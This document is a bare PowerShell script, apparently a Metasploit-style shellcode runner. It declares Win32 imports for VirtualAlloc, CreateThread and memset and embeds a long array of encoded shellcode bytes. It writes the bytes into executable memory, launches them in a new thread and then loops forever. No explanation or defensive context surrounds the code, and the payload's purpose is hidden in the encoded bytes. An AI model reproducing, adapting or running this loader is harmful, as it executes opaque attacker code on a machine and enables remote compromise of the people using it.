$9Wk = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $9Wk -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x84,0xbb,0x0f,0xcc,0xda,0xdd,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x6f,0x83,0xe8,0xfc,0x31,0x50,0x11,0x03,0x50,0x11,0xe2,0x71,0x47,0xe7,0x45,0x79,0xb8,0xf8,0x35,0xf0,0x5d,0xc9,0x67,0x66,0x15,0x78,0xb8,0xed,0x7b,0x71,0x33,0xa3,0x6f,0x02,0x31,0x6b,0x9f,0xa3,0xfc,0x4d,0xae,0x34,0x31,0x51,0x7c,0xf6,0x53,0x2d,0x7f,0x2b,0xb4,0x0c,0xb0,0x3e,0xb5,0x49,0xad,0xb1,0xe7,0x02,0xb9,0x60,0x18,0x27,0xff,0xb8,0x19,0xe7,0x8b,0x81,0x61,0x82,0x4c,0x75,0xd8,0x8d,0x9c,0x26,0x57,0xc5,0x04,0x4c,0x3f,0xf5,0x35,0x81,0x23,0xc9,0x7c,0xae,0x90,0xba,0x7e,0x66,0xe9,0x43,0xb1,0x46,0xa6,0x7a,0x7d,0x4b,0xb6,0xbb,0xba,0xb4,0xcd,0xb7,0xb8,0x49,0xd6,0x0c,0xc2,0x95,0x53,0x90,0x64,0x5d,0xc3,0x70,0x94,0xb2,0x92,0xf3,0x9a,0x7f,0xd0,0x5b,0xbf,0x7e,0x35,0xd0,0xbb,0x0b,0xb8,0x36,0x4a,0x4f,0x9f,0x92,0x16,0x0b,0xbe,0x83,0xf2,0xfa,0xbf,0xd3,0x5b,0xa2,0x65,0x98,0x4e,0xb7,0x1c,0xc3,0x06,0x29,0x44,0x8f,0xd6,0xdd,0xf1,0x06,0xb9,0x74,0x77,0x3e,0x11,0xef,0xcb,0xc9,0xbc,0xe8,0x2c,0xe0,0xf0,0x09,0x85,0x5d,0xa4,0xa2,0x7c,0x09,0x70,0x1b,0xf8,0x6e,0x7b,0x76,0x11,0x10,0xdf,0x48,0x2f,0x81,0x8e,0xc0,0xac,0x70,0x60,0x7f,0xe3,0x21,0xd2,0x17,0x54,0x4c,0x4d,0x21,0xa5,0x9b,0x99,0xe1,0x03,0x12,0x8c,0xac,0xdb,0x54,0x02,0x31,0x98,0x06,0x30,0xe3,0xf1,0xf4,0xe4,0x6b,0x19,0xad,0x2a,0x57,0x22,0x98,0xba,0x61,0xb6,0x32,0xe6,0x05,0xc7,0x01,0x18,0xd6,0x4e,0x85,0x72,0xd2,0x00,0x2f,0x9c,0x8c,0xc8,0xda,0xe4,0xae,0x8f,0xdb,0x3c,0xff,0x70,0x74,0xe8,0x57,0xd8,0x2c,0x7e,0x75,0xe0,0xc8,0x05,0x7a,0x39,0x6d,0x39,0xf1,0xdc,0x26,0xb5,0x7e,0x9b,0xb8,0xc9,0x7e,0xb7,0x69,0x20,0xef,0x47,0x89,0xb3,0xf8,0xe4,0x76,0x4c,0x07,0xdb,0xe9,0xdd,0x9c,0x45,0x8a,0x0f,0x38,0xfe,0x29,0x50,0x29,0x95,0x80,0x90,0xf2,0x3a,0x88,0x12,0x67,0xb9,0x1c,0x79,0x75,0xd7,0x9e,0x2a,0x11,0xfd,0x68,0x0e,0xae,0xfe,0x41,0x3c,0x00,0xc1,0x0f,0xfb,0x67,0xc2,0xe6,0x3f,0x33,0x49,0xb4,0x9b,0xb4,0x60,0x84,0x50,0xc7,0xd2,0x55,0xcf,0xa0,0xc0,0xc3,0x66,0xd2,0x1a,0x3e,0xfd,0xd3,0x91,0xed,0xa6,0x56,0x99,0x99,0x40,0x33,0x1a,0x35,0x3d,0x4e,0x5e,0x91,0xb1,0x00,0x0c,0xb1,0xe4,0xf7,0x1c,0x1a,0x08,0x22,0xe3,0x70,0xf2,0x26,0x2a,0xdb,0x93,0x7e,0x25,0x5c,0x31,0x80,0x9f,0x08,0xb6,0x29,0x48,0xfd,0x3d,0xba,0x0f,0x02,0x94,0x2f,0x10,0x94,0xe7,0x05,0xb2,0x32,0xf7,0xb3,0x5b,0x2a,0xf8,0xc3,0x63,0x0f,0x75,0x4e,0xf3,0xfd,0x26,0xec,0x7e,0x66,0xf7,0x96,0xe9,0x04,0x62,0x57,0x02,0xd1,0x93,0xa8,0x2d,0xbe,0x06,0x3d,0xb0,0x2c,0xb6,0xa6,0x1a,0xcf,0x27,0x44,0x63;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$UuW=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($UuW.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$UuW,0,0,0);for (;;){Start-sleep 60};